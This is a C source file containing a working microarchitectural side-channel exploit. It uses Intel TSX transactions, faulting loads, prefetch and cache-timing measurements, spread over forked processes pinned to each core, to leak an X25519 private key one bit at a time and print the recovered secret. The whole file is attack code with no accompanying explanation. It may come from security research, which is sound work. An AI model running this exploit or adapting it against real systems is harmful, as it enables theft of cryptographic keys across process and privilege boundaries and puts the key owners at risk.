#define _GNU_SOURCE
#include <stdio.h>
#include <sys/wait.h>
#include <sched.h>
#include <stdlib.h>
#include <signal.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>
#include <immintrin.h>
#include <err.h>
#include <stdint.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/mman.h>
#include <errno.h>




#define MEMSZ (256*512 * 100)

#define CACHE_MISS 100

static inline __attribute__((always_inline)) int is_cached(void *ptr1) {
  uint32_t diff;
  asm volatile (
      //"cpuid\n\t"
      "mfence\n\t"
      "lfence\n\t"
      "RDTSC\n\t"
      "mov rbx, rax\n\t"
      "mov rdx, [%1]\n\t"
      "RDTSCP\n\t"
      "lfence\n\t"
      "sub rax, rbx\n\t"
      "mov %0, eax\n\t"

      : "=b" (diff)
      : "S"(ptr1)
      : "rax", "rcx", "rdx");

  return diff < CACHE_MISS;
}

const unsigned long probe1_addr = 0x7895e4000;
char *probe1 = (char*) probe1_addr;
const unsigned long probe3_addr = 0x560000000;
char *probe3 = (char*) probe3_addr;


static int mlpds(unsigned long prefix) {
  prefix ^= probe1_addr;
  _mm_clflush(probe1);
  _mm_mfence();
  _mm_sfence();
  _mm_lfence();
  asm volatile("CPUID"::: "eax","ebx","ecx","edx", "memory");


  // TODO find optimal number of iterations.
  for (int i = 0; i < 32; i++) {
  asm volatile(
      ".align 64\n\t"
      "0:\n\t"
      "clflush [%0]\n\t"
      "sfence\n\t"
      // idk why, helps speed up
      "xbegin 2f\n\t"

      //xbegin block:
      "mov   rax, [-1]\n\t"
      "xor   rax, %1\n\t"
      "prefetchnta [rax]\n"

      "xend\n\t"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"

      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"

      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"

      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "3: jmp 3b\n"
      "2:\n\t"
      //"dec r15\n\t"
      //"jne 0b\n\t"
      :
      : "r" (probe3), "r"(prefix)
      : "rax");
  }

  int p1 = is_cached(probe1);
  if (p1) { return 0; }
  return -1;
}


void map() {
  if (mmap(probe1, 4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != probe1) {
    err(1, "mmap(probe1)");
  }
  memset(probe1, 0x99, 4096);
  if (mmap(probe3, 4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != probe3) {
    err(1, "mmap(probe3)");
  }
  memset(probe3, 0x99, 4096);
}

void print_secret(unsigned char* secret) {
  printf("Secret:");
  for (int i = 0; i < 32; i++) {
    printf(" %02x", secret[i]);
  }
  printf("\n");
}

void set_bit(uint8_t* privkey, int bit, int to) {
  if (bit < 0) return;
  privkey[bit / 8] &= ~(1 << (bit & 7));
  privkey[bit / 8] |= to << (bit & 7);
}

int X25519_fake(uint8_t* out, const uint8_t* privkey,
                const uint8_t* peer_pubkey, int iteration);

void X25519_public_from_private(uint8_t out_public_value[32],
                                const uint8_t private_key[32]);

#define MARGIN 3
#define CPU_NUM 6

size_t poss[4][5];

void do_kill(int pid) {
  kill(pid, SIGKILL);
  waitpid(pid, NULL, 0);
}

void run_child(void* shmem) {
  map();
  unsigned short* results = (unsigned short*) shmem;
  while (1) {
    for (int k = 0; k < 4; k++) {
      for (int wq = 0; wq < 5; wq++) {
        int byte = mlpds(poss[k][wq]);
        if (byte != -1) {
          results[k * 5 + wq]++;
          printf("[pid %d] res: %d for [%d][%d]\n", getpid(), byte, k, wq);
        }
      }
    }
  }
}

int fork_children(int* pids, int* affin, void* shmem) {
  int count = 0;
  for (int i = 0; i < CPU_NUM; i++) {
    int pid = fork();
    if (pid == -1) {
      err(1, "could not fork");
    }
    if (pid == 0) {
      run_child(shmem);
    }
    pids[count] = pid;
    affin[count] = i;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(i, &set);
    int error = sched_setaffinity(pid, sizeof(set), &set);
    if (error) {
      if (errno == EINVAL) {
        do_kill(pid);
        printf("Affinity %d does not work, killing temporary process.\n", i);
      }
      else {
        printf("err %d\n", error);
        err(1, "sched_setaffinity");
      }
    }
    else {
      printf("Created new child, pid = %d, affinity = core %d\n", pid, i);
      count++;
    }
  }
  return count;
}

int affinity_valid(int pid, int aff) {
  cpu_set_t set;
  if (sched_getaffinity(pid, sizeof(set), &set) < 0) {
    err(1, "sched_getaffinity");
  }
  return CPU_COUNT(&set) == 1 && CPU_ISSET(aff, &set);
}

void do_iteration(int iteration, uint8_t* privkey, uint8_t* pubkey) {
  uint8_t out[40];
  unsigned short results[4][5] = {0};

  // iteration - 2 if you want to look at two bits.
  // iteration - 1 if you want to look at one bit.
  int x_it = iteration - 1;
  if (x_it < 0) x_it = 0;

  for (int which_qword = 0; which_qword < 5; which_qword++) {
    set_bit(privkey, iteration, 0);
    set_bit(privkey, iteration-1, 0);
    X25519_fake(out, privkey, pubkey, x_it);
    poss[0][which_qword] = ((size_t*)out)[which_qword];

    set_bit(privkey, iteration, 0);
    set_bit(privkey, iteration-1, 1);
    X25519_fake(out, privkey, pubkey, x_it);
    poss[1][which_qword] = ((size_t*)out)[which_qword];

    set_bit(privkey, iteration, 1);
    set_bit(privkey, iteration-1, 0);
    X25519_fake(out, privkey, pubkey, x_it);
    poss[2][which_qword] = ((size_t*)out)[which_qword];

    set_bit(privkey, iteration, 1);
    set_bit(privkey, iteration-1, 1);
    X25519_fake(out, privkey, pubkey, x_it);
    poss[3][which_qword] = ((size_t*)out)[which_qword];
  }

  printf("iter=%d\nTargets:\n", iteration);
  for (int i = 0; i < 5; i++) {
    for (int j = 0; j < 4; j++) {
      printf("%016llx ", poss[j][i]);
    }
    printf("\n");
  }
  int diff_abs = 0;
  int bit;
  int num_children = 0;
  int pids[1024];
  int affin[1024];
  void* shmem;
  shmem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (shmem == MAP_FAILED) {
    err(1, "shared memory alloc failed");
  }

  do {
    if (num_children == 0) {
      num_children = fork_children(pids, affin, shmem);
      memset(shmem, 0, sizeof(results));
      usleep(100 * 1000);
    }
    memset(shmem, 0, sizeof(results));
    usleep(100 * 1000);
    unsigned short results_temp[4][5] = {0};
    memcpy(results_temp, shmem, sizeof(results_temp));
    memset(shmem, 0, sizeof(results));
    int all_good = 1;
    for (int i = 0; i < num_children; i++) {
      all_good &= affinity_valid(pids[i], affin[i]);
    }
    if (all_good) {
      for (int wq = 0; wq < 5; wq++) {
        for (int ij = 0; ij < 4; ij++) {
          results[ij][wq] += results_temp[ij][wq];
        }
      }

      int sums[4] = {0};
      for (int wq = 0; wq < 5; wq++) {
        for (int ij = 0; ij < 4; ij++) {
          sums[ij] += results[ij][wq];
        }
        printf("%d %d | %d %d\n", results[0][wq], results[1][wq], results[2][wq], results[3][wq]);
      }

      int x0 = sums[0] + sums[1];
      int x1 = sums[2] + sums[3];
      diff_abs = x0 - x1;
      if (diff_abs < 0) diff_abs = -diff_abs;
      bit = x1 > x0;
      printf("--- diff_abs %d (%d vs. %d, total %d)\n", diff_abs, x0, x1, x0+x1);
    }
    else {
      printf("Killing children - affinity changed.\n");
      for (int i = 0; i < num_children; i++) {
        do_kill(pids[i]);
      }
      num_children = 0;
    }
  } while (diff_abs < MARGIN);
  printf("Killing children as we leaked the bit.\n");
  for (int i = 0; i < num_children; i++) {
    do_kill(pids[i]);
  }
  set_bit(privkey, iteration-1, 0);
  set_bit(privkey, iteration, bit);
  print_secret(privkey);
}

void stage3(size_t secret_offset, size_t saved_rbp) {
  uint8_t pubkey[32];
  uint8_t client_privkey[32];
  printf("Input client private key:\n");
  for (int i = 0; i < 32; i++) {
    unsigned int n;
    scanf("%x", &n);
    client_privkey[i] = n;
  }
  X25519_public_from_private(pubkey, client_privkey);
  uint8_t privkey[32] = {0};
  privkey[31] &= 127;
  privkey[31] |= 64;
  // The algorithm starts at that iteration.
  int start_iteration = 253;

  // Check if checkpoint available.
  FILE* f = fopen("/tmp/checkpoint", "r");
  if (!f) {
    printf("Starting from scratch.\n");
  }
  else {
    printf("Starting from checkpoint.\n");
    fscanf(f, "%d", &start_iteration);
    for (int i = 0; i < 32; i++) {
      unsigned int n;
      fscanf(f, "%x", &n);
      privkey[i] = n;
    }
    fclose(f);
  }

  print_secret(privkey);

  // Ending on iteration 3, since bits 2, 1 and 0 are unset.
  for (int iteration = start_iteration; iteration >= 3; iteration--) {
    do_iteration(iteration, privkey, pubkey);
  }
  privkey[0] &= 248;
  print_secret(privkey);
}

void run() {
  stage3(0, 0);
}

int main() {
  run();

  return 0;
}

